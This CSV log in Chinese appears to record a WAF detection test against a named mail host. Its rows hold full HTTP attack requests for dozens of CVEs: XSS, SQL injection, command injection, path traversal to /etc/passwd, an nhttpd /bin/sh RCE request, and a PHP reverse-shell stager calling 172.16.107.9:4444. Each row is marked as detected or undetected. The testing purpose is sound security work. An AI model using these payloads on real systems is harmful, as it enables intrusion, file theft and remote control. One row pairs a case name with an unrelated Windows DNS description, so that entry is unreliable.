请求头信息,URL,标志,用例名称,用例描述,东莞现场WAF检测情况
 GET /index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME&qhaeshs=7069606402842427393 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606402842427393-r-nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_1) AppleWebKit/531.0 (KHTML， like Gecko) Chrome/35.0.803.0 Safari/531.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME,7069606402842427393,Web应用Shoretel跨站脚本注入漏洞（CVE-2020-28351）,Mitel ShoreTel是加拿大敏迪（Mitel）的一个通讯平台。Mitel ShoreTel 19.46.1802.0版本 conferencing component 存在跨站脚本漏洞，该漏洞源于HOME MEETING＆页面上对时区对象的验证不足。攻击者可利用该漏洞进行反射跨站点脚本攻击(通过路径信息到index.php)。,检测
 GET /sample-apps/hello/%2f/?qhaeshs=7069606353647435777 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606353647435777-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/101.0.4951.67 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/sample-apps/hello/%2f/,7069606353647435777,Web应用Shiny目录遍历漏洞（CVE-2021-3374）,"Microsoft Windows DNS是美国微软（Microsoft）公司的一个域名解析服务。域名系统（DNS）是包含TCP / IP的行业标准协议套件之一，并且DNS客户端和DNS服务器共同为计算机和用户提供计算机名称到IP地址的映射名称解析服务。Microsoft Windows DNS Server存在代码注入漏洞。以下产品和版本受到影响：Windows 10 Version 1909 for x64-based Systems,Windows 10 Version 1909 for ARM64-based Systems,Windows 10 Version 21H1 for x64-based Systems,Windows 10 Version 21H1 for ARM64-based Systems,Windows 10 Version 21H1 for 32-bit Systems,Windows 10 Version 2004 for 32-bit Systems,Windows 10 Version 2004 for ARM64-based Systems,Windows 10 Version 2004 for x64-based Systems,Windows Server, version 2004 (Server Core installation),Windows 10 Version 20H2 for x64-based Systems,Windows Server 2019,Windows Server 2019  (Server Core installation),Windows 10 Version 1909 for 32-bit Systems,Windows 10 Version 20H2 for 32-bit Systems,Windows 10 Version 20H2 for ARM64-based Systems,Windows Server, version 20H2 (Server Core Installation),Windows 10 Version 1809 for 32-bit Systems,Windows 10 Version 1809 for x64-based Systems,Windows 10 Version 1809 for ARM64-based Systems,Windows 7 for 32-bit Systems Service Pack 1,Windows 7 for x64-based Systems Service Pack 1,Windows 8.1 for 32-bit systems,Windows 8.1 for x64-based systems,Windows RT 8.1,Windows Server 2012,Windows Server 2012 (Server Core installation),Windows Server 2012 R2,Windows Server 2012 R2 (Server Core installation),Windows 10 for 32-bit Systems,Windows 10 for x64-based Systems,Windows Server 2008 for 32-bit Systems Service Pack 2,Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation),Windows Server 2008 for x64-based Systems Service Pack 2,Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation),Windows Server 2008 R2 for x64-based Systems Service Pack 1,Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation),Windows Server 2016,Windows Server 2016  (Server Core installation)。",检测
 GET /logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)&qhaeshs=7069606328963956737 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606328963956737-r-nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.5.3 (KHTML， like Gecko) Version/4.0 Safari/534.5.3-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain),7069606328963956737,Web应用Servicenow跨站脚本注入漏洞（CVE-2022-38463）,ServiceNow San Diego Patch是美国ServiceNow公司的一系列补丁程序。ServiceNow San Diego Patch 4b 和 Patch 6及之前版本存在跨站脚本漏洞，该漏洞源于允许在注销功能中进行XSS。,检测
 GET /cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C/h1%3E%3Cscript%3Ealert(123)%3C/script%3E&qhaeshs=7069606303882018817 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606303882018817-r-nCache-Control: max-age=0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/91.0.4472.77 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9，en;q=0.8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C/h1%3E%3Cscript%3Ealert(123)%3C/script%3E,7069606303882018817,Web应用Sco跨站脚本注入漏洞（CVE-2020-25495）,Xinuos Openserver是美国Xinuos公司的一款基于FreeBSD的操作系统。Xinuos Openserver version 5 and 6 存在跨站脚本漏洞，该漏洞允许远程攻击者可利用该漏洞通过参数section注入任意web脚本或HTML标签。,检测
 GET /php/ssh_form.php?hostname=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ctitle%3E&qhaeshs=7069606282247798784 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606282247798784-r-nUser-Agent: Mozilla/5.0 (Android 9; Mobile; rv:64.0) Gecko/64.0 Firefox/64.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/php/ssh_form.php?hostname=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ctitle%3E,7069606282247798784,Web应用Rseenet跨站脚本注入漏洞（CVE-2021-21800）,Advantech R-SeeNet是中国台湾研华（Advantech）公司的一个工业监控软件。该软件基于 snmp 协议进行监控平台，并且适用于 Linux、Windows 平台。Advantech R-SeeNet v2.4.12(20.10.2020)的 ssh_form.php 脚本功能中存在跨站脚本漏洞。如果用户访问特制的 URL，可能会导致在目标用户浏览器的上下文中执行任意 JavaScript 代码。,检测
 GET /php/ping.php?hostname=%7Cdir&qhaeshs=7069606273213267969 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606273213267969-r-nUser-Agent: Mozilla/5.0 (Android 5.1; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/php/ping.php?hostname=%7Cdir,7069606273213267969,Web应用Rseenet远程命令执行漏洞（CVE-2021-21805）,Advantech R-SeeNet是中国台湾研华（Advantech）公司的一个工业监控软件。该软件基于 snmp 协议进行监控平台，并且适用于 Linux、Windows 平台。Advantech R-SeeNet存在操作系统命令注入漏洞，该漏洞源于ping.php 的脚本功能。,检测
 GET /php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22&qhaeshs=7069606264082268161 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606264082268161-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22,7069606264082268161,Web应用Rseenet跨站脚本注入漏洞（CVE-2021-21802）,Advantech R-SeeNet是中国台湾研华（Advantech）公司的一个工业监控软件。该软件基于 snmp 协议进行监控平台，并且适用于 Linux、Windows 平台。Advantech R-SeeNet v2.4.12(20.10.2020)的 device_graph_page.php 脚本功能中存在跨站脚本漏洞。如果用户访问特制的 URL，可能会导致在目标用户浏览器的上下文中执行任意 JavaScript 代码。,检测
 GET /php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22&qhaeshs=7069606254959656961 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606254959656961-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22,7069606254959656961,Web应用Rseenet跨站脚本注入漏洞（CVE-2021-21801）,Advantech R-SeeNet是中国台湾研华（Advantech）公司的一个工业监控软件。该软件基于 snmp 协议进行监控平台，并且适用于 Linux、Windows 平台。Advantech R-SeeNet存在跨站脚本漏洞，该漏洞源于Advantech R-SeeNet 的 device_graph_page.php 脚本功能中存在多个跨站脚本漏洞。,检测
 GET /php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22&qhaeshs=7069606245862211585 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606245862211585-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22,7069606245862211585,Web应用Rseenet跨站脚本注入漏洞（CVE-2021-21803）,Advantech R-SeeNet是中国台湾研华（Advantech）公司的一个工业监控软件。该软件基于 snmp 协议进行监控平台，并且适用于 Linux、Windows 平台。Advantech R-SeeNet v2.4.12(20.10.2020)的 device_graph_page.php 脚本功能中存在跨站脚本漏洞。如果用户访问特制的 URL，可能会导致在目标用户浏览器的上下文中执行任意 JavaScript 代码。,检测
 GET /php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E&qhaeshs=7069606236743794689 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606236743794689-r-nUser-Agent: Opera/8.16.(Windows NT 5.2; ta-LK) Presto/2.9.169 Version/12.00-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E,7069606236743794689,Web应用Rseenet跨站脚本注入漏洞（CVE-2021-21799）,Advantech R-SeeNet是中国台湾研华（Advantech）公司的一个工业监控软件。该软件基于 snmp 协议进行监控平台，并且适用于 Linux、Windows 平台。Advantech R-SeeNet v2.4.12存在跨站脚本漏洞，该漏洞源于如果用户访问一个特殊设计的URL，它可能导致在目标用户的浏览器上下文中执行任意的JavaScript代码。,检测
 GET /www/delivery/afr.php?refresh=10000&%5C%22)%27，10000000);alert(1337);setTimeout(%27alert(%5C%22%22&qhaeshs=7069606211817046017 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606211817046017-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/88.0.4324.190 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9-r-nCookie: OAID=a9007bdce33c291658962e937aa06039-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www/delivery/afr.php?refresh=10000&%5C%22)%27，10000000);alert(1337);setTimeout(%27alert(%5C%22%22,7069606211817046017,Web应用Reviveadserver跨站脚本注入漏洞（CVE-2020-8115）,Revive Adserver是Revive Adserver团队的一套开源的广告管理系统。该系统提供广告投放、广告位管理、数据统计等功能。Revive Adserver 5.0.3及之前版本中的afr.php文件（可公开访问）中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。,检测
 GET /goform/login_process?username=test%22%3E%3Csvg/onload=alert(document.domain)%3E&qhaeshs=7069606195438288897 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606195438288897-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: -r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/goform/login_process?username=test%22%3E%3Csvg/onload=alert(document.domain)%3E,7069606195438288897,Web应用Reprise跨站脚本注入漏洞（CVE-2022-28363）,Reprise Software Reprise License Manager是美国Reprise Software公司的软件许可工具包，为商业软件应用程序的发布者提供本地和基于云的许可证管理，许可证实施和产品激活解决方案。Reprise License Manager 14.2版本存在跨站脚本漏洞，该漏洞源于/goform/login_process的username参数通过GET请求导致跨站点脚本漏洞（XSS）。,检测
 GET /goform/activate_process?isv=&akey=&hostid=&count=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&qhaeshs=7069606186386980865 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606186386980865-r-nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/533.0 (KHTML， like Gecko) Chrome/44.0.858.0 Safari/533.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/goform/activate_process?isv=&akey=&hostid=&count=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,7069606186386980865,Web应用Reprise跨站脚本注入漏洞（CVE-2021-45422）,Reprise Software Reprise License Manager是美国Reprise Software公司的软件许可工具包，为商业软件应用程序的发布者提供本地和基于云的许可证管理，许可证实施和产品激活解决方案。Reprise Software Reprise License Manager存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。,检测
 GET /flight/Html.aspx?id=1/**/and/**/1=sys.fn_varbintohexstr(hashbytes('MD5'，'1234'))--&qhaeshs=7069606161216962561 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606161216962561-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/flight/Html.aspx?id=1/**/and/**/1=sys.fn_varbintohexstr(hashbytes('MD5'，'1234'))--,7069606161216962561,Web应用票友注入漏洞（CNVD-2021-16326）,票友软件是机票代理商的管理系统，是国内最成熟的机票管理系统。票友 /flight/Html.aspx参数id 注入漏洞。,检测
 POST /phpcollab/clients/editclient.php?id=1.wJOolEpp&action=update&qhaeshs=7069606109996122113 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 1152-r-nUser-Agent: python-requests/2.25.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: multipart/form-data; boundary=_Part_875_3089955431_4042776696-r-nqhaeshs: 7069606109996122113-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n/*<?php /**/ error_reporting(0); $ip = '172.16.107.9'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip， $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET， SOCK_STREAM， SOL_TCP); $res = @socket_connect($s， $ip， $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s， 4); break; case 'socket': $len = socket_read($s， 4); break; } if (!$len) { die(); } $a = unpack("Nlen"， $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s， $len-strlen($b)); break; case 'socket': $b .= socket_read($s， $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'),/phpcollab/clients/editclient.php?id=1.wJOolEpp&action=update,7069606109996122113,Web应用Phpcollab SQL 注入漏洞（CVE-2017-6090）,phpCollab是一套基于Web的项目协作管理软件。该软件具有任务分配、讨论、日志和通知等功能。PhpCollab 2.5.1及之前的版本中的clients/editclient.php文件存在任意文件上传漏洞。远程攻击者可利用该漏洞上传并访问带有可执行扩展的文件，来执行任意代码。,检测
 GET /plugins/search/..%5C..%5C..%5Cconf%5Copenfire.xml?qhaeshs=7069606034393792513 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606034393792513-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCookie: JSESSIONID=node0zf9mb285tsfk1in03sbatm6jn1.node0; csrf=fiBLl2EhSR8vf19-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/plugins/search/..%5C..%5C..%5Cconf%5Copenfire.xml,7069606034393792513,Web应用Openfire目录遍历漏洞（CVE-2019-18393）,Ignite Realtime Openfire是Ignite Realtime社区的一款采用Java开发且基于XMPP（前称Jabber，即时通讯协议）的跨平台开源实时协作（RTC）服务器，它能够构建高效率的即时通信服务器，并支持上万并发用户数量。Ignite Realtime Openfire 4.4.2及之前版本中的PluginServlet.java文件存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。,检测
 GET /logout?next=%208%22onmouseover=%22alert(document.domain)&qhaeshs=7069605962797023233 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605962797023233-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/3.0)-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/logout?next=%208%22onmouseover=%22alert(document.domain),7069605962797023233,Web应用Openedx跨站脚本注入漏洞（CVE-2022-32195）,EDX Open edX是美国EDX公司的一套在线学习管理系统。EDX Open edX 2022-06-06之前版本存在安全漏洞。攻击者利用该漏洞通过注销 URL 中的“next”参数进行 跨站脚本攻击。,检测
 POST /login.php?qhaeshs=7069605937790582785 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 44-r-nqhaeshs: 7069605937790582785-r-nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.01) AppleWebKit/533.2.1 (KHTML， like Gecko) Version/5.1 Safari/533.2.1-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nReferer: ><script>alert(document.domain)</script><-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nlanguage=en&user=user&pass=pass&submit=Login,/login.php,7069605937790582785,Web应用Nvrsolo跨站脚本注入漏洞（CVE-2022-33119）,NUUO Network Video Recorder（NVR）是中国台湾NUUO公司的一款网络视频记录器。NUUO Network Video Recorder NVRsolo v03.06.02 版本存在安全漏洞，该漏洞源于包含一个通过 login.php 反射的跨站点脚本（XSS）问题。,检测
 POST /.%0d./.%0d./.%0d./.%0d./bin/sh?qhaeshs=7069605912956108801 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 17-r-nUser-Agent: python-requests/2.25.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nqhaeshs: 7069605912956108801-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-necho-necho-n{} 2>&1,/.%0d./.%0d./.%0d./.%0d./bin/sh,7069605912956108801,Web应用Nhttpd目录遍历漏洞（CVE-2019-16278）,nostromo nhttpd是一款开源的Web服务器。nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。,检测
 PUT /service/rest/internal/ui/saml?_dc=1609730666282&qhaeshs=7069605782098018304 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 539-r-nqhaeshs: 7069605782098018304-r-nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0-r-nAccept: application/json， text/plain， */*-r-nAccept-Language: en-US，en;q=0.5-r-nAccept-Encoding: gzip， deflate-r-nReferer: http://172.16.101.58:8082/-r-nContent-Type: application/json;charset=utf-8-r-nNX-ANTI-CSRF-TOKEN: 0.42156783346218696-r-nCookie: kfNH_2132_saltkey=HNDKrC1d; kfNH_2132_lastvisit=1609395113; kfNH_2132_ulastactivity=6807WJ9Azhd24sWTdADfcFU2K9BS%2Fx6L5IoSXyoYhFtBeg%2B5hflN; NX-ANTI-CSRF-TOKEN=0.42156783346218696; NXSESSIONID=a4e3f422-1745-46a5-af28-10efbdb14b83-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/service/rest/internal/ui/saml?_dc=1609730666282,7069605782098018304,Web应用Nexus3 XML实体注入漏洞（CVE-2020-29436）,Sonatype Nexus Repository Manager（NXRM）是美国Sonatype公司的一款存储库管理器，它主要用于管理、存储和分发软件等。Sonatype Nexus Repository Manager 存在安全漏洞，攻击者可利用该漏洞可以向发送恶意XML数据，以读取文件、扫描站点或触发拒绝服务。,检测
 GET /NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x&qhaeshs=7069605757037051905 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605757037051905-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x,7069605757037051905,Web应用Netbiblio跨站脚本注入漏洞（CVE-2021-42551）,AlCoda NetBiblio WebOpac是瑞士AlCoda公司的一个图书馆、媒体中心、文献中心和档案馆的集成 It 解决方案。AlCoda NetBiblio WebOPAC存在安全漏洞，攻击者可利用该漏洞执行跨站点脚本攻击。此问题影响：4.0.0.320之前的版本;4.0.0.328以上版本。不影响4.0.0.335及以上版本。,检测
 GET /download.php?file=../../../../../etc/passwd&qhaeshs=7069605731938336769 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605731938336769-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/download.php?file=../../../../../etc/passwd,7069605731938336769,Web应用蓝海卓越计费管理系统任意文件读取漏洞,蓝海卓越认证计费管理系统是一套以实现网络运营为基础，增强全局安全为中心，提高管理效率为目的的网络安全运营管理系统。 download.php文件存在任意文件读取漏洞，攻击者通过 ../ 遍历目录可以读取服务器上的敏感文件。,检测
 GET /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st&qhaeshs=7069605704167849985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605704167849985-r-nUser-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/531.0 (KHTML， like Gecko) Chrome/53.0.886.0 Safari/531.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st,7069605704167849985,Web应用Nacos越权访问漏洞（CVE-2021-29442）,nacos是中国阿里巴巴（Alibaba）的一个动态服务发现、配置和服务管理平台。该软件支持基于 DNS 和基于 RPC 的服务发现，可提供提供实时健康检查，阻止服务向不健康的主机或服务实例发送请求等功能。Nacos 存在访问控制错误漏洞，该漏洞源于ConfigOpsController允许用户执行管理操作，比如查询数据库，甚至清除数据库。,未检测
